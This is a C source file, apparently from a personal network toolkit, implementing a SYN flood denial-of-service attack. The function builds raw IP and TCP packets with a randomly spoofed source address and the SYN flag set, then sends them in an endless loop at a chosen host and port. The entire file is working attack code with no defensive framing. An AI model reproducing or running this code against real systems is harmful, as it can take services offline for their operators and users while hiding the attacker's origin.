/*
 *  DOS_SYN_Flood.c
 *
 *  Created on: 21 jun. 2022
 *  Author: lucho
*/

#include "TCP_Syn_Port_Scanner.h"

int ddos_syn_flood(in_addr_t ip, int port){
	printf("%sDOS SYN Flood %srunning...\n\n", WHITE, GREEN);
	signal(SIGINT, sigintHandler);
	srand(time(0));
	int sk=socket (AF_INET, SOCK_RAW , IPPROTO_TCP);
	if(sk<0){
		show_error("socket() error.", errno);
		exit(EXIT_FAILURE);
	}
	char datagram[4096];
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in  dest;
	struct pseudo_header psh;
	int source_port=rand()%50000+10000;
	char source_ip[20]="";
	sprintf(source_ip,"%d.%d.%d.%d", rand()%255+1, rand()%255+1, rand()%255+1, rand()%255+1);
	memset(datagram,0,4096);
	dest_ip.s_addr=ip;
	//IP Header init
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	int hton=rand()%50000+10000;
	iph->id = htons (hton);
	iph->frag_off = htons(16384);
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr (source_ip);
	iph->daddr = dest_ip.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	//TCP Header init
	tcph->source = htons (source_port);
	tcph->dest = htons (port);
	tcph->seq = htonl(1105024978);
	tcph->ack_seq = 0;
	tcph->doff = sizeof(struct tcphdr)/4;
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (14600);
	tcph->check = 0;
	tcph->urg_ptr = 0;
	int one = 1;
	const int *val = &one;
	if (setsockopt (sk, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0){
		printf ("setsockopt() error. Error: %d (%s)\n", errno, strerror(errno));
		exit(EXIT_FAILURE);
	}
	dest.sin_family=AF_INET;
	dest.sin_addr.s_addr=ip;
	tcph->dest=htons(port);
	tcph->check=0;
	psh.source_address=inet_addr(source_ip);
	psh.dest_address=dest.sin_addr.s_addr;
	psh.placeholder=0;
	psh.protocol=IPPROTO_TCP;
	psh.tcp_length=htons(sizeof(struct tcphdr));
	printf("%sFlooding from: %s%s:%d...\n\n",WHITE,HWHITE,source_ip, source_port);
	while(!finishCurrentProcess){
		memcpy(&psh.tcp,tcph,sizeof(struct tcphdr));
		tcph->check=csum((unsigned short*) &psh,sizeof(struct pseudo_header));
		if(sendto(sk,datagram,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &dest,sizeof (dest))<0){
			show_error("Error sending syn packet.", errno);
			exit(EXIT_FAILURE);
		}
	}
	close(sk);
	printf("%sDOS SYN Flood finished...\n", WHITE);
	printf("%s", DEFAULT);
	finishCurrentProcess=FALSE;
	return RETURN_OK;
}
